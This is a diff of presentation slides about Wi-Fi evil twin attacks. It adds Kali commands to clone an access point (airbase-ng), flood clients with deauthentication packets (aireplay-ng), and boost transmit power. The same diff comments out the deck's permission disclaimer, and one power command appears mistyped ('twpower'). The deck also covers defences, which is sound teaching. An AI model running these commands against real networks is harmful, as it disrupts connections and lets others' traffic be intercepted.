@@ -58,6 +58,11 @@
         background: black;
         color: red
     }
+    .note{
+        background: black;
+        color: red;
+        text-align: center;
+    }
     </style>
   </head>
   <body>
@@ -98,27 +103,32 @@ class: center, middle, inverse, presentation-title
 .center[.full6[![wifi gipy](https://media.giphy.com/media/z3olKbFZt92yk/giphy.gif)]]
 .footnote[Slides can be accessed through https://git.io/vFKre]
 ---
+class: center, middle, inverse, presentation-title
+
+# Demo Time
+---
+
 # How does WiFi works?
 
-- SSID stands for Service Set IDentifier
+- ESSID
 
 .footnote[Slides can be accessed through https://git.io/vFKre]
 ---
 # How does WiFi works?
 
-- SSID stands for Service Set IDentifier
+- ESSID
 - Signal strength 📶
 
 .footnote[Slides can be accessed through https://git.io/vFKre]
 ---
-class: disclaimer
-# DISCLAIMER
+<!-- class: disclaimer -->
+<!-- # DISCLAIMER -->
 
-- This Presentation is intended for educational purposes only and I cannot be held liable for any kind of damages done whatsoever to your machine, or other damages.
+<!-- - This Presentation is intended for educational purposes only and I cannot be held liable for any kind of damages done whatsoever to your machine, or other damages. -->
 
-- Don't try this attack on any others system without having context knowledge or permission, this may harm to someone directly or indirectly. 
+<!-- - Don't try this attack on any others system without having context knowledge or permission, this may harm to someone directly or indirectly. --> 
 
----
+<!-- --- -->
 # What is an Evil Twin attack?
 <!-- An evil twin is a fraudulent Wi-Fi access point that appears to be legitimate, set up to eavesdrop on wireless communications.[1] The evil twin is the wireless LAN equivalent of the phishing scam. -->
 - An evil twin is a fraudulent Wi-Fi access point that appears to be legitimate
@@ -126,20 +136,52 @@ class: disclaimer
 
 .footnote[Slides can be accessed through https://git.io/vFKre]
 ---
-# How to Evil Twin
+# How to setup an Evil Twin
 
 - Configure it exactly the same way as an existing network
-    - Same SSID
+    - Same ESSID
     - Same Security Settings
 - Overpower the existing access points
+
+.footnote[Slides can be accessed through https://git.io/vFKre]
+
+---
+# Evil Twin in Kali
+- install bridge utils
+```bash
+apt-get install bridge-utils
+```
+- Start monitoring interface
+```bash
+airmon-ng start <interface>
+    ```
+- Create the evil twin
+```bash
+airbase-ng -a <BSSID here> --essid <ESSID here> -c <channel here> <interface name>
+```
+
+.footnote[Slides can be accessed through https://git.io/vFKre]
+---
+# Evil Twin in Kali
+
+- Deauthentication or Bumping Him Off
+```bash
+aireplay-ng --deauth 0 -a <BSSID> mon0 --ignore-negative-one
+```
+- Turn up the Power!
+```bash
+iwconfig <interface> twpower <power>
+```
+
+.note[before turning the power up check MAXIMUM WIFI TRANSMISSION POWER IN YOUR COUNTRY]
 ---
 # Evil Twin is Bad
 .full[![But Why?](https://media.giphy.com/media/s239QJIh56sRW/source.gif)]
 ---
 # Why is Evil Twin Bad?
 
-- Striping SSL
 - Man In The Middle (MITM) attack
+- Striping SSL
 - DNS Spoofing
 <!-- - Striping SSL (https://forums.kali.org/showthread.php?27420-Best-Method-for-setting-up-an-evil-twin-with-dnsspof-ssl-strip-etc) -->
 <!-- - MITM attack (https://www.youtube.com/watch?v=5NHycA_R4xY) -->
@@ -160,20 +202,20 @@ class: center, middle, inverse, presentation-title
 # Demo Time
 ---
 class: center, middle, inverse, presentation-title
-# How to protect yourself agianst Evil Twin?
+# How to protect yourself against Evil Twin?
 ---
-# How to protect yourself agianst Evil Twin?
+# How to protect yourself against Evil Twin?
 - Always remove the Wi-Fi networks that you don't use
 
 .footnote[Slides can be accessed through https://git.io/vFKre]
 ---
-# How to protect yourself agianst Evil Twin?
+# How to protect yourself against Evil Twin?
 - Always remove the Wi-Fi networks that you don't use
 - Always VPN in a untrusted network
 
 .footnote[Slides can be accessed through https://git.io/vFKre]
 ---
-# How to protect yourself agianst Evil Twin?
+# How to protect yourself against Evil Twin?
 - Always remove the Wi-Fi networks that you don't use
 - Always VPN in a untrusted network
 - Always use **SSL**
